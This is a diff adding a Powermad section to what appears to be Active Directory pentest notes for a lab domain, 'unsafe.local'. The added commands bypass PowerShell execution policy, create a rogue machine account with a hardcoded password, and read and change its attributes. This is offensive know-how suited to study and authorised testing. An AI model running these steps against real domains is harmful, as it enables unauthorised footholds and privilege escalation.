@@ -148,6 +148,36 @@ $forest = "unsafe.local"
 $domain="gotham.unsafe.local"
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetSidFilteringStatus($domain)
 ```
+<br/>
+
+**Powermad**
+```powershell
+#1. Spawn a Powershell as a user in that domain using runas and its /netonly flag and enter the password.
+C:\> runas /netonly /user:UNSAFE\ruser powershell.exe
+
+#2. Set Execution policy as Bypass
+Set-ExecutionPolicy Bypass -Scope CurrentUser
+
+#3. Import Module
+Import-Module .\Powermad.ps1
+
+#4. Add a machine account
+$pass = ConvertTo-SecureString "MaQ.321" -AsPlainText -Force
+New-MachineAccount -MachineAccount maq -Password $pass -Verbose
+
+# Get an attribute value of the machine account
+Get-MachineAccountAttribute -MachineAccount maq -Attribute distinguishedname
+
+# Get SID of the machine account creator (ms-DS-CreatorSID)
+Get-MachineAccountCreator -DistinguishedName "CN=maq,CN=Computers,DC=unsafe,DC=local"
+Get-MachineAccountCreator
+
+# Set an attribute value of the machine account
+Set-MachineAccountAttribute -MachineAccount maq -Attribute description -Value test
+
+# Disable the machine account
+Disable-MachineAccount -MachineAccount maq
+```
 
 #### Reference
 https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html \
